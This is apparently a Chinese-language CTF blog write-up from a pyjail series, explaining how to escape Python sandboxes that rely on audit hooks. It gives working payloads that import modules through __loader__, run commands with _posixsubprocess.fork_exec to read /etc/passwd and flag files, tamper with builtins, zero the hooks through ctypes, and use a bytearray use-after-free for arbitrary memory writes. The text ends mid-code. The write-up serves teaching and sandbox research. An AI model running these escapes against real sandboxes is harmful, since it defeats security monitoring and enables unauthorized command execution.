---
title: pyjail bypass-07 绕过 audit hook
date: 2023-05-30 10:23:57
last_modified_at: 2025-02-20
categories:
- Python
tags:
- pyjail
image:
  path: /assets/images/pyjail.jpg
toc: true
---
> - [pyjail 沙箱逃逸原理](/posts/python-沙箱逃逸原理/)
> - [绕过删除模块或方法](/posts/pyjail-bypass-01-绕过删除模块或方法/)
- [绕过基于字符串匹配的过滤](/posts/pyjail-bypass-02-字符串变换绕过/)
- [绕过命名空间限制](/posts/pyjail-bypass-03-绕过命名空间限制/)
- [绕过多行限制](/posts/pyjail-bypass-05-绕过长度限制/)
- [绕过长度限制](/posts/pyjail-bypass-04-绕过多行限制/)
- [变量覆盖与函数篡改](/posts/pyjail-bypass-06-变量覆盖与函数篡改/)
- [绕过 audit hook](/posts/pyjail-bypass-07-绕过-audit-hook/)
- [绕过 AST 沙箱](/posts/pyjail-bypass-08-绕过-AST-沙箱/)
- [绕过输出限制](/posts/pyjail-bypass-09-绕过输出限制/)
- [绕过 opcode 沙箱](/posts/pyjail-bypass-10-绕过-opcode-沙箱/)
- [利用生成器栈](/posts/pyjail-bypass-11-利用生成器栈/)



## 绕过基于 sys.addaudithook 的 audit hook 
> Python中的审计钩子（Audit Hook）是从 Python 3.8 版本引入的一项安全功能，旨在让 Python 运行时的操作对外部监控工具可见。该功能允许开发者通过注册钩子函数来监控和控制特定的事件，尤其是与安全相关的操作。这种机制为系统管理员、测试人员和安全专家提供了一个有效的手段来检测、记录或阻止特定操作。
>
> 审计钩子通过 sys.addaudithook() 函数添加。每当发生特定事件时，Python会调用这些钩子函数，并将事件名称和相关参数传递给它们。钩子函数可以选择记录这些事件，或者在检测到不允许的操作时抛出异常，从而阻止操作继续进行。


Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动。

Python 中的审计事件包括但不限于以下几类：

- `import`：发生在导入模块时。
- `open`：发生在打开文件时。
- `write`：发生在写入文件时。
- `exec`：发生在执行Python代码时。
- `compile`：发生在编译Python代码时。
- `socket`：发生在创建或使用网络套接字时。
- `os.system`，`os.popen`等：发生在执行操作系统命令时。
- `subprocess.Popen`，`subprocess.run`等：发生在启动子进程时。

所有的事件列表可见：
- [Audit events table — Python 3.13.0 documentation](https://docs.python.org/3/library/audit_events.html)
- [PEP 578 – Python Runtime Audit Hooks](https://peps.python.org/pep-0578/)

calc_jail_beginner_level6 这道题中使用了 audithook 构建沙箱,采用白名单来进行限制.audit hook 属于 python 底层的实现,因此常规的变换根本无法绕过.

题目源码如下:
```py
import sys

def my_audit_hook(my_event, _):
    WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if my_event not in WHITED_EVENTS:
        raise RuntimeError('Operation not permitted: {}'.format(my_event))

def my_input():
    dict_global = dict()
    while True:
      try:
          input_data = input("> ")
      except EOFError:
          print()
          break
      except KeyboardInterrupt:
          print('bye~~')
          continue
      if input_data == '':
          continue
      try:
          complie_code = compile(input_data, '<string>', 'single')
      except SyntaxError as err:
          print(err)
          continue
      try:
          exec(complie_code, dict_global)
      except Exception as err:
          print(err)


def main():
  WELCOME = '''
  _                _                           _       _ _   _                _   __
 | |              (_)                         (_)     (_) | | |              | | / /
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | '_ \
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/
              __/ |                          _/ |
             |___/                          |__/                                                                        
  '''

  CODE = '''
  dict_global = dict()
    while True:
      try:
          input_data = input("> ")
      except EOFError:
          print()
          break
      except KeyboardInterrupt:
          print('bye~~')
          continue
      if input_data == '':
          continue
      try:
          complie_code = compile(input_data, '<string>', 'single')
      except SyntaxError as err:
          print(err)
          continue
      try:
          exec(complie_code, dict_global)
      except Exception as err:
          print(err)
  '''

  print(WELCOME)

  print("Welcome to the python jail")
  print("Let's have an beginner jail of calc")
  print("Enter your expression and I will evaluate it for you.")
  print("White list of audit hook ===> builtins.input,builtins.input/result,exec,compile")
  print("Some code of python jail:")
  print(CODE)
  my_input()

if __name__ == "__main__":
  sys.addaudithook(my_audit_hook)
  main()
```
这道题需要绕过的点有两个:
1. 绕过 import 导入模块. 如果直接使用 import,就会触发 audithook
   ```py
   > __import__('ctypes')
    Operation not permitted: import
   ```
2. 绕过常规的命令执行方法执行命令. 利用 os, subproccess 等模块执行命令时也会触发 audithook


### 调试技巧
本地调试时可以在 hook 函数中添加打印出 hook 的类型.
```py
import sys

def my_audit_hook(my_event, _):
    print(f'[+] {my_event}, {_}')
    WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if my_event not in WHITED_EVENTS:
        raise RuntimeError('Operation not permitted: {}'.format(my_event))

sys.addaudithook(my_audit_hook)
```

这样在测试 payload 时就可以知道触发了哪些 hook
```py
> import os
[+] builtins.input/result, ('import os',)
[+] compile, (b'import os', '<string>')
[+] exec, (<code object <module> at 0x7f966795bec0, file "<string>", line 1>,)
```


### `__loader__.load_module` 导入模块
`__loader__.load_module(fullname)` 也是 python 中用于导入模块的一个方法并且不需要导入其他任何库.

```py
__loader__.load_module('os')
```

`__loader__` 实际上指向的是 `_frozen_importlib.BuiltinImporter` 类,也可以通过别的方式进行获取
```py
>>> ().__class__.__base__.__subclasses__()[84]
<class '_frozen_importlib.BuiltinImporter'>
>>> __loader__
<class '_frozen_importlib.BuiltinImporter'>
>>> ().__class__.__base__.__subclasses__()[84].__name__
'BuiltinImporter'
>>> [x for x in ().__class__.__base__.__subclasses__() if 'BuiltinImporter' in x.__name__][0]
<class '_frozen_importlib.BuiltinImporter'>
```

`__loader__.load_module` 也有一个缺点就是无法导入非内建模块. 例如 socket
```py
>>> __loader__.load_module('socket')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<frozen importlib._bootstrap>", line 290, in _load_module_shim
  File "<frozen importlib._bootstrap>", line 721, in _load
  File "<frozen importlib._bootstrap>", line 676, in _load_unlocked
  File "<frozen importlib._bootstrap>", line 573, in module_from_spec
  File "<frozen importlib._bootstrap>", line 776, in create_module
ImportError: 'socket' is not a built-in module
```

### _posixsubprocess 执行命令

_posixsubprocess 模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了 _posixsubprocess.

该模块的核心功能是 fork_exec 函数，fork_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.

在我本地的 Python 3.11 中具体的函数声明如下:
```py
def fork_exec(
    __process_args: Sequence[StrOrBytesPath] | None,
    __executable_list: Sequence[bytes],
    __close_fds: bool,
    __fds_to_keep: tuple[int, ...],
    __cwd_obj: str,
    __env_list: Sequence[bytes] | None,
    __p2cread: int,
    __p2cwrite: int,
    __c2pred: int,
    __c2pwrite: int,
    __errread: int,
    __errwrite: int,
    __errpipe_read: int,
    __errpipe_write: int,
    __restore_signals: int,
    __call_setsid: int,
    __pgid_to_set: int,
    __gid_object: SupportsIndex | None,
    __groups_list: list[int] | None,
    __uid_object: SupportsIndex | None,
    __child_umask: int,
    __preexec_fn: Callable[[], None],
    __allow_vfork: bool,
) -> int: ...
```

- `__process_args`: 传递给新进程的命令行参数，通常为程序路径及其参数的列表。
- `__executable_list`: 可执行程序路径的列表。
- `__close_fds`: 如果设置为True，则在新进程中关闭所有的文件描述符。
- `__fds_to_keep`: 一个元组，表示在新进程中需要保持打开的文件描述符的列表。
- `__cwd_obj`: 新进程的工作目录。
- `__env_list`: 环境变量列表，它是键和值的序列，例如：["PATH=/usr/bin", "HOME=/home/user"]。
- `__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite`: 这些是文件描述符，用于在父子进程间进行通信。
- `__errpipe_read, __errpipe_write`: 这两个文件描述符用于父子进程间的错误通信。
- `__restore_signals`: 如果设置为1，则在新创建的子进程中恢复默认的信号处理。
- `__call_setsid`: 如果设置为1，则在新进程中创建新的会话。
- `__pgid_to_set`: 设置新进程的进程组 ID。
- `__gid_object, __groups_list, __uid_object`: 这些参数用于设置新进程的用户ID 和组 ID。
- `__child_umask`: 设置新进程的 umask。
- `__preexec_fn`: 在新进程中执行的函数，它会在新进程的主体部分执行之前调用。
- `__allow_vfork`: 如果设置为True，则在可能的情况下使用 vfork 而不是 fork。vfork 是一个更高效的 fork，但是使用 vfork 可能会有一些问题 。

下面是一个最小化示例:
```py
import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

结合上面的 `__loader__.load_module(fullname)` 可以得到最终的 payload:
```py
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module('os').pipe()), False, False,False, None, None, None, -1, None, False)
```

可以看到全程触发了 `builtins.input/result`, compile, exec 三个 hook, 这些 hook 的触发都是因为 input, compile, exec 函数而触发的, `__loader__.load_module` 和 `_posixsubprocess` 都没有触发.
```py
[+] builtins.input/result, ('__loader__.load_module(\'_posixsubprocess\').fork_exec([b"/bin/cat","/flag"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\'os\').pipe()), False, False,False, None, None, None, -1, None, False)',)
[+] compile, (b'__loader__.load_module(\'_posixsubprocess\').fork_exec([b"/bin/cat","/flag"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\'os\').pipe()), False, False,False, None, None, None, -1, None, False)', '<string>')
[+] exec, (<code object <module> at 0x7fbecc924670, file "<string>", line 1>,)
```

_posixsubprocess 执行命令时本身没有回显，是可以将命令的结果存放在 __c2pwrite 参数中。
```py
import _posixsubprocess
import os
import time

std_pipe = os.pipe()
err_pipe = os.pipe()

_posixsubprocess.fork_exec(
    (b"/bin/bash",b"-c",b"cat /flag*"),
    [b"/bin/bash"],
    True,
    (),
    None,
    None,
    -1,
    -1,
    -1,
    std_pipe[1], #c2pwrite
    -1,
    -1,
    *(err_pipe),
    False,
    False,
    False,
    None,
    None,
    None,
    -1,
    None,
    False,
)
time.sleep(0.1)
content = os.read(std_pipe[0],1024)
print(content)
```


### 另一种解法: 篡改内置函数
这道 audit hook 题还有另外一种解法.可以看到白名单是通过 set 函数返回的, set 作为一个内置函数实际上也是可以修改的
```py
WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
```

比如我们将 set 函数修改为固定返回一个包含了 os.system 函数的列表
```py
__builtins__.set = lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']
```
这样 set 函数会固定返回带有 os.system 的列表.

```py
__builtins__.set = lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']
```

最终 payload:
```py
# 
exec("for k,v in enumerate(globals()['__builtins__']): print(k,v)")

# 篡改函数
exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('cat flag2.txt')")
```


### 其他不触发 hook 的方式
使用 `__loader__.load_module('os')` 是为了获取 os 模块, 其实在 no builtins 利用手法中, 无需导入也可以获取对应模块. 例如:

```py
# 获取 sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"]

# 获取 os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"]

# 其他的 payload 也都不会触发
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
```

## 绕过基于 CPython 的 audit hook
audit hook 不仅可以在 python 层面进行定义，还可以在 CPython 中进行编写，下面的沙箱取自 DiceCTF 2024 IRS，如果使用 CPython 来定义 audit hook，至少在 python 层面就没法覆盖函数。
```c
#include "Python.h"

static int audit(const char *event, PyObject *args, void *userData) {
	static int running = 0;
	if (running) {
		exit(0);
	}
	if (!running && !strcmp(event, "exec")) running = 1;
	return 0;
}

static PyObject* irs_audit(PyObject *self, PyObject *args) {
	PySys_AddAuditHook(audit, NULL);
	Py_RETURN_NONE;
}

static PyMethodDef IrsMethods[] = {
	{"audit", irs_audit, METH_VARARGS, ""},
	{NULL, NULL, 0, NULL}
};

static PyModuleDef IrsModule = {
	PyModuleDef_HEAD_INIT, "irs", NULL, -1, IrsMethods,
	NULL, NULL, NULL, NULL
};

static PyObject* PyInit_Irs(void) {
	return PyModule_Create(&IrsModule);
}

int main(int argc, char **argv) {
	PyImport_AppendInittab("irs", &PyInit_Irs);
	return Py_BytesMain(argc, argv);
}
```

项目 [Nambers/python-audit\_hook\_head\_finder: PWNable pyjail](https://github.com/Nambers/python-audit_hook_head_finder) 给出了几种通过修改 python 内存来篡改该 audit hook 的方式。

编译时可能提示找不到符号，可以手动指定库文件路径进行编译。
```bash
#!/bin/bash
gcc -I/usr/include/python3.11 $(python3.11-config --cflags) audit_hook_head_finder.c -o audit_hook_head_finder_ver311 $(python3.11-config --ldflags) -lpython3.11
gcc -I/usr/include/python3.12 $(python3.12-config --cflags) audit_hook_head_finder.c -o audit_hook_head_finder_ver312 $(python3.12-config --ldflags) -lpython3.12
```

### 利用 ctypes 覆盖 audit hook
ctypes 是一个允许与 C 数据类型和内存地址交互的库，可以直接访问和修改 Python 对象的内存布局。如何定位到内存中的 audit hook 函数？我们首先要了解两个重要的结构体：_PyRuntimeState 和 PyInterpreterState

PyInterpreterState 和 _PyRuntimeState 是两个核心数据结构，分别用于表示单个 Python 解释器的状态和整个 Python 运行时的全局状态。

1. _PyRuntimeState：Python 运行时的全局状态，包含所有解释器和线程的状态。 _PyRuntime 就是 _PyRuntimeState。
2. PyInterpreterState：这是每个 Python 解释器的状态，包含与该解释器相关的所有信息，如线程、模块等。

两者的关系：
1. _PyRuntimeState 是整个 Python 程序的全局运行时状态，管理着所有的 PyInterpreterState 实例。每
2. 每个 PyInterpreterState 都表示一个独立的 Python 解释器。
3. 每个 PyInterpreterState 都有自己的 audit_hooks 字段，用于存储与该解释器相关的审计钩子。同时，全局运行时状态 _PyRuntimeState 中也有一个全局审计钩子列表，用于监控整个程序的操作。

#### _PyRuntimeState 
_PyRuntimeState 结构体中存储了 audit hook 列表 audit_hooks。详情可见：[_PyRuntimeState 结构体](https://github.com/python/cpython/blob/3966d8d626fc9adcdf0663024d4ae6e6be7ef858/Include/internal/pycore_runtime.h#L199)
```c 
typedef struct pyruntimestate {
    ...
    struct pyinterpreters {
        PyThread_type_lock mutex;
        PyInterpreterState *head;
        PyInterpreterState *main;
        int64_t next_id;
    } interpreters;


    struct {
        PyMutex mutex;
        _Py_AuditHookEntry *head;
    } audit_hooks;
    ...
    PyInterpreterState _main_interpreter;

} _PyRuntimeState;
```c
_Py_AuditHookEntry 是一个 audit hook 链表。
```py
typedef struct _Py_AuditHookEntry {
    struct _Py_AuditHookEntry *next;
    Py_AuditHookFunction hookCFunction;
    void *userData;
} _Py_AuditHookEntry;

```
因此，从 _PyRuntimeState.audit_hooks.head 就可以获取到 audit hook 链表的地址。
```py
+-------------------+
|   _PyRuntimeState |
+-------------------+
|                   |
| audit_hooks.head  | --> [List of audit hooks]
+-------------------+
```
需要注意的是，python3.11 与 python3.12 不同，仅使用 audit_hook_head 指针进行存放。
```c
typedef struct pyruntimestate {
    ...
    _Py_AuditHookEntry *audit_hook_head;
    ...
} _PyRuntimeState;
```
_Py_AuditHookEntry 没有变化：
```c
typedef struct _Py_AuditHookEntry {
    struct _Py_AuditHookEntry *next;
    Py_AuditHookFunction hookCFunction;
    void *userData;
} _Py_AuditHookEntry;
```

_PyRuntimeState 中存储的 audit hook，对应的就是 CPython 中通过 PySys_AddAuditHook 添加的审计钩子。PySys_AddAuditHook 用于在 Python 运行时中添加全局审计钩子, 通过该函数添加的审计钩子会影响整个 Python 运行时中的所有解释器，无论是主解释器还是子解释器。

```c
static int audit(const char *event, PyObject *args, void *userData) {
	static int running = 0;
	if (running) {
		exit(0);
	}
	if (!running && !strcmp(event, "exec")) running = 1;
	return 0;
}

static PyObject* irs_audit(PyObject *self, PyObject *args) {
	PySys_AddAuditHook(audit, NULL);
	Py_RETURN_NONE;
}
```

#### PyInterpreterState
PyInterpreterState 也同样存储了 audit hook，详情可见：[PyInterpreterState](https://github.com/python/cpython/blob/3966d8d626fc9adcdf0663024d4ae6e6be7ef858/Include/internal/pycore_interp.h#L96)

```c
   The PyInterpreterState typedef is in Include/pytypedefs.h.
   */
struct _is {
    ...
    PyObject *audit_hooks;
    ...
}
```
但这个 audit_hooks 实际上是一个 PyObject 指针，对应的是 Python 层面的 audit hook，也就是通过 sys.addaudithook() 添加的审计钩子。通过该函数添加的审计钩子只会影响当前解释器（主解释器或某个子解释器），不会影响其他解释器。

> ps: 当某个操作（如文件打开、模块导入）发生时，Python 会触发相应的审计事件。事件首先会触发全局（C 层面）的审计钩子，然后再触发当前解释器（Python 层面）的审计钩子。

#### 获取 audit hook 函数地址
在 CPython 中，某些常用的不可变对象（如空元组、空字符串等）是单例对象，这些对象在解释器启动时就被创建并缓存起来，因此其内存地址是固定不变的。

下面是一个测试代码。
```py
print(hex(id(())))
print(hex(id(())))
print(hex(id('')))
print(hex(id('')))
print(hex(id({})))
print(hex(id({})))
print(hex(id([])))
print(hex(id([])))

# 0xb56d58
# 0xb56d58
# 0xb4a370
# 0xb4a370
# 0x7fb20e2c6640
# 0x7fb20e2c6640
# 0x7fb20e7ccb40
# 0x7fb20e7ccb40
```
可以看到空元组和空字符串的地址都没有变化。而空列表和空字典每次执行时地址会发生变化，但在同一个脚本中多次执行的结果都是不变的。

在相同版本的 Python 中，数据结构（如 PyInterpreterState 和 _PyRuntimeState）的大小和字段位置通常在编译时就确定了大小和布局。==因此从某个对象（如空元组）的地址到审计钩子列表指针的位置通常是一个常数。==

依据这个原理，项目 [Nambers/python-audit_hook_head_finder: PWNable pyjail](https://github.com/Nambers/python-audit_hook_head_finder) 通过在 C 层面打印出 _PyRuntimeState.audit_hooks.head 和 PyInterpreterState.audit_hooks 的地址，然后计算与空元组地址的偏移，得到了这个偏移常量。

相关代码如下：
1. 获取 _PyRuntimeState.audit_hooks.head 和 PyInterpreterState.audit_hooks 的地址
    ```c
    #define GET_RUNTIME_ADDR() &_PyRuntime
    #define GET_INTERP_ADDR() _PyRuntime.interpreters.head
    #define GET_INTERP_AUDIT_HOOK_PTR_ADDR() &GET_INTERP_ADDR()->audit_hooks
    #if PY_MINOR_VERSION == 12
        #define GET_RUNTIME_AUDIT_HOOK_PTR_ADDR() &_PyRuntime.audit_hooks.head
    #elif PY_MINOR_VERSION == 11
        #define GET_RUNTIME_AUDIT_HOOK_PTR_ADDR() &_PyRuntime.audit_hook_head
    #else
        #define GET_RUNTIME_AUDIT_HOOK_PTR_ADDR() &_PyRuntime.audit_hook_head
    #endif
    ```
2. 获取偏移值.
    ```py
    obj = ctypes.byref(ctypes.py_object(()))
    ptr_tp = ctypes.POINTER(ctypes.c_uint64)
    # somewhere in stack
    obj_addr = ctypes.cast(obj, ptr_tp).contents.value
    # we also can use the line below without creating a temporary `obj` variable
    assert ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value == obj_addr
    # offset to get audit hook pointer address (which has a "fixed" offset)
    audit_hook_ptr_offset_by_py = get_interp_audit_hook_ptr_addr() - obj_addr
    audit_hook_ptr_offset_by_c = get_runtime_audit_hook_ptr_addr() - obj_addr
    print(f"audit_hook_ptr_offset_by_py={hex(audit_hook_ptr_offset_by_py)}\naudit_hook_ptr_offset_by_c={hex(audit_hook_ptr_offset_by_c)}")
    ```


#### 覆盖 audit hook
因而在针对该版本 Python 进行利用时，只需要通过空元组的地址，再加上这个偏移值，就能够找到 audit hook 的地址。利用部分如下：
```py
audit_hook_by_py: list = ctypes.cast(ctypes.cast(obj_addr + audit_hook_ptr_offset_by_py, ptr_tp).contents.value, ctypes.py_object).value
# and as C array ig
audit_hook_by_c: list = ctypes.cast(obj_addr + audit_hook_ptr_offset_by_c, ptr_tp)
print(f"len={len(audit_hook_by_py)} should be 1")

# - POC - 

ctypes._os.system("echo 'test audit hook -- this will trigger hook'")

audit_hook_by_py.pop()
ctypes.memset(audit_hook_by_c, 0, 8)

ctypes._os.system("echo 'test audit hook -- this will not'")
```
1. python 层面的 audit hook 可以通过 ctypes.cast 将 PyInterpreterState.audit_hooks 地址处的 .contents.value 转换为一个 python 原生类型（py_object），最终得到一个 list ，利用 pop 函数将其弹出即可
2. c 层面的 audit hook 虽然保存在 list 里，然而实际上只通过 ctypes.cast 将其转换为了一个指针 64 位指针： `<class '__main__.LP_c_ulong'>`，指向了 hook 函数的地址。通过 memset 将地址清空置空则达到了清楚 audit hook 的目的。

==实际利用时可以使用仓库中的 POC2.py==


### 利用 UAF 覆盖 audit hook
如果沙箱里没有 ctypes 库，那么可以借助 python UAF 进行利用。python UAF 值的是 python 某些版本中频繁出现的一类 bug，例如：
- [Invalid memory write in bytearray · Issue #91153 · python/cpython](https://github.com/python/cpython/issues/91153)

虽然在低版本中进行了修复，但在 python 高版本中仍旧能够利用，虽然大多数情况下不会造成较大危害，但在沙箱逃逸场景中可以被用于任意地址读写。

#### python UAF
- [Invalid memory write in bytearray · Issue #91153 · python/cpython](https://github.com/python/cpython/issues/91153)
- [DiceCTF 2024 IRS](https://maplebacon.org/2024/02/dicectf2024-irs/)

```py
class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = B()
memory[id(250) + 24] = 100
print(250)
# 100
```

该脚本的执行结果理应为 250，但实际运行时得到了 100。

1. uaf 被分配为具有 56 字节后备缓冲区的 bytearray。
2. uaf[23] = B() 尝试将类 B 的实例插入到字节数组 uaf 中。然而，这会触发 Python 的类型转换机制，因为字节数组只能存储整数.
   1. Python 会调用 B 的 `__index__()` 方法，将其转换为整数。
   2. 这个方法会清空并重置全局变量 uaf 和 memory，然后返回整数 1. 因此，实际上这行代码相当于：`uaf[23] = 1`

但是之后的代码依旧令人无法理解，深入 CPython 代码可以更好理解。
```c
/* Objects/bytearrayobject.c */

static int
bytearray_ass_subscript(PyByteArrayObject *self, PyObject *index, PyObject *values)
{
    Py_ssize_t start, stop, step, slicelen, needed;
    char *buf, *bytes;
    buf = PyByteArray_AS_STRING(self);

    if (_PyIndex_Check(index)) {
        Py_ssize_t i = PyNumber_AsSsize_t(index, PyExc_IndexError);

        if (i == -1 && PyErr_Occurred()) {
            return -1;
        }

        int ival = -1;

        // GH-91153: We need to do this *before* the size check, in case values
        // has a nasty __index__ method that changes the size of the bytearray:
        if (values && !_getbytevalue(values, &ival)) {
            return -1;
        }

        if (i < 0) {
            i += PyByteArray_GET_SIZE(self);
        }

        if (i < 0 || i >= Py_SIZE(self)) {
            PyErr_SetString(PyExc_IndexError, "bytearray index out of range");
            return -1;
        }

        if (values == NULL) {
            /* Fall through to slice assignment */
            start = i;
            stop = i + 1;
            step = 1;
            slicelen = 1;
        }
        else {
            assert(0 <= ival && ival < 256);
            buf[i] = (char)ival;
            return 0;
        }
    }
    ...
}
```
作者对于这个过程的介绍如下：
1. uaf 被分配为具有 56 字节缓冲区的 bytearray。
2. uaf[23] = B() 触发类型转换，调用 bytearray_ass_subscript(uaf, 23, B()) 
3. buf = PyByteArray_AS_STRING(self); 缓存 buf 指向缓冲区。
4. 调用 `_getbytevalue` 将 B() 转换为字节，从而调用 `B.__index__` 。
5. `B.__index__` 清除 uaf ，从而==释放其缓冲区==。
6. `B.__index__` 构造一个名为 memory 的新字节数组，它恰好占用已释放的缓冲区的内存（仍缓存在 buf 中）。
7. `B.__index__` 将 uaf 扩展了 56 个字节，因此大小看起来没有变化。
8. `buf[i] = (char)ival` 将 1 （ B() 的返回值）分配给已释放缓冲区的索引 23，覆盖 memory 的大小字段 ob_size 。
9. memory 现在是一个 NULL backing buffer（空 bytearray 初始化时没有分配 buffer），并且具有荒谬的大小字段。

最终，memory 实际上成为一个扩展整个虚拟内存的缓冲区，允许我们读取/写入任何任意地址。由于小整数缓存在内存中的 small_ints[] 数组中，所以 memory[id(250) + 24] = 100 实际上是将 250 这个整数对象的值字段覆盖成了 100。

对于上述的流程，不免有几个疑问：
1. 为什么要将 uaf 索引为 23 的位置进行赋值。
2. 为什么要对 250 这个数字取地址并偏移 24 个字节。small_ints 又是什么？

为了进一步理解这个过程，我们需要了解一些基础知识

#### bytearray 内存布局
在 CPython 中，每个对象都有一个特定的内存布局。以 bytearray 为例，它的内存布局通常包含以下几个部分：
```c
/* Object layout */
typedef struct {
    PyObject_VAR_HEAD
    Py_ssize_t ob_alloc;   /* How many bytes allocated in ob_bytes */
    char *ob_bytes;        /* Physical backing buffer */
    char *ob_start;        /* Logical start inside ob_bytes */
    Py_ssize_t ob_exports; /* How many buffer exports */
} PyByteArrayObject;
```
PyObject_VAR_HEAD 是用于定义可变长对象的头部信息的宏：
```c
#define PyObject_VAR_HEAD  \
    Py_ssize_t ob_refcnt;  \
    struct _typeobject *ob_type;  \
    Py_ssize_t ob_size;

```
1. 引用计数 (ob_refcnt)：用于跟踪该对象被引用的次数，占用 8 字节。
2. 类型指针 (ob_type)：指向描述该对象类型的结构体（例如，bytearray 类型），占用 8 字节。
3. 大小字段 (ob_size)：表示该对象可以容纳的数据量（即字节数组的长度），占用 8 字节。

因此，当新构造的 memory bytearray 占用了 uaf 所在的内存空间，uaf 中索引为 16-23 恰好位于 memory ob_size 内存处，将不同索引赋值为 1 将得到不同的结果。
```py
from test_UAF_test_01 import get_ob_size
class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1
    
uaf = bytearray(56)
# uaf[16] = B()
# uaf[17] = B()   # ob_size of memory: 0x100000000
uaf[23] = B()     # ob_size of memory: 0x100000000000000

get_ob_size(memory)
memory[id(250) + 24] = 100
print(250)

# ob_size of memory: 0x100000000000000
# 100
```
get_ob_size 函数定义如下：
```py
import ctypes

class PyByteArrayObject(ctypes.Structure):
    _fields_ = [
        ('ob_refcnt', ctypes.c_ssize_t),  # 引用计数
        ('ob_type', ctypes.c_void_p),     # 类型指针
        ('ob_size', ctypes.c_ssize_t),    # 大小字段
        ('ob_alloc', ctypes.c_ssize_t),   # 分配的字节数
        ('ob_bytes', ctypes.c_void_p),    # 实际物理缓冲区
        ('ob_start', ctypes.c_void_p),    # 缓冲区的逻辑起点
        ('ob_exports', ctypes.c_ssize_t)  # 导出的缓冲区数量
    ]

def get_ob_size(memory):
    addr_of_memory = id(memory)

    ob_size_offset = ctypes.sizeof(ctypes.c_ssize_t) * 2

    # 使用 ctypes 从内存中读取 ob_size 的值
    ob_size_value = ctypes.c_ssize_t.from_address(addr_of_memory + ob_size_offset).value

    print(f"ob_size of memory: {hex(ob_size_value)}")
```
#### small_ints 内存布局
Python 的小整数缓存机制: 在 Python 中，小整数（通常是 -5 到 256 之间的整数）是单例对象，并且为了提高性能，这些小整数会存储在一个内部的数组中，并且不会被频繁创建和销毁，通常称为 small_ints[]。因此，当你使用 250 时，实际上得到的是指向这个缓存数组中某个位置的指针。

small_ints 相关定义如下：
```c
#define NSMALLPOSINTS 257   // 缓存正小整数 (0 到 256)
#define NSMALLNEGINTS 5     // 缓存负小整数 (-5 到 -1)

static PyIntObject *small_ints[NSMALLNEGINTS + NSMALLPOSINTS];
```
小整数对象的定义如下,PyObject_HEAD 是所有 Python 对象共有的头部，包含引用计数（ob_refcnt）和类型信息（ob_type）。
```c
typedef struct {
    PyObject_HEAD
    long ob_ival;  // 存储整数值
} PyIntObject;
```
1. 引用计数 (ob_refcnt) 占用 8 字节。
2. 类型指针 (ob_type) 占用 8 字节。
3. 实际值 (ob_ival) 占用 8 字节。

再回过头来看 payload：`memory[id(250) + 24] = 100`，首先通过 id 获取 small_ints 中 250 的地址，偏移 24 字节处为实际值 ob_ival，然后将其赋值为 100，稍后再次打印 250 时，输出的结果就是 100 了。

==ps: 此处还有疑问，为什么 memory 的索引能够定位到 small_ints，难道 memory 的地址位于内存地址的起始位置？==

#### 获取 audit hook 函数地址

仓库中的 POC-no-ctypes.py 脚本编写了利用逻辑，大体步骤如下：
1. 获取 `os.system.__init__` 函数的地址。
2. 利用 UAF 从该地址向后进行遍历。
3. 首先遍历一定范围的内存，在其中找到潜在 audit hook 指针。
   ```py
   for i in range(DEPTH):
    if len(hex(int.from_bytes(memory[ptr + i:ptr + i + 8], 'little'))) == len(hex(get_runtime_audit_hook_ptr_addr())):
        p.append(i)
   ```
4. 继续对每个潜在的位置，在一定范围内继续搜索，精确匹配指定地址的内容与实际 audit hook 地址是否相同，如果相同，则打印出偏移。
    ```py
    for j in p:
        ptr2 = ptr + j
        ptr2 = int.from_bytes(memory[ptr2:ptr2 + 8], 'little')
        print("searching", j)
        for i in range(DEPTH):
            nptr = int.from_bytes(memory[ptr2 + i:ptr2 + i + 8], 'little')
            if hex(nptr)[:6] == hex(get_runtime_audit_hook_ptr_addr())[:6] and len(hex(nptr)) == len(hex(get_runtime_audit_hook_ptr_addr())):
